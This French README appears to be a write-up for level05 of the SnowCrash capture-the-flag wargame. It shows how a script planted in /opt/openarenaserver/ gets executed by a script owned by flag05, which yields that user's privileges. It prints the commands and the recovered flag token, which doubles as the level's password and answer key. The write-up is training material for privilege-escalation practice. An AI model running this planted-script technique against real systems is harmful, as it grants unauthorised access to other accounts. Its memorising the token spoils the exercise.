# README - Exploitation du script openarenaserver (level05)

## Étapes suivies pour obtenir le Flag05

### 1. Identification du binaire

Le fichier `/usr/sbin/openarenaserver` est un script exécutable appartenant à `flag05` :

```bash
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

L'analyse du script montre qu'il exécute des fichiers dans le répertoire `/opt/openarenaserver/` :

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

### 2. Exploitation de l'exécution automatique

Le script exécute automatiquement tous les fichiers dans `/opt/openarenaserver/`. Nous pouvons créer un fichier malveillant pour exécuter `getflag` et stocker le flag dans un fichier temporaire.

#### a. Création d'un fichier malveillant

```bash
echo "/bin/sh -c 'getflag > /tmp/flag_output'" > /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

#### b. Attente de l'exécution

Le fichier est automatiquement exécuté par le script `openarenaserver`, puis supprimé.

### 3. Récupération du flag

Vérifiez si le flag est écrit dans `/tmp/flag_output` :

```bash
cat /tmp/flag_output
```

### 4. Résultat

```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### 5. Passage à l'utilisateur suivant

Utilisez le flag pour vous connecter à l'utilisateur `flag05` :

```bash
level05@SnowCrash:~$ su flag05
Password: viuaaale9huek52boumoomioc
flag05@SnowCrash:~$ getflag
```
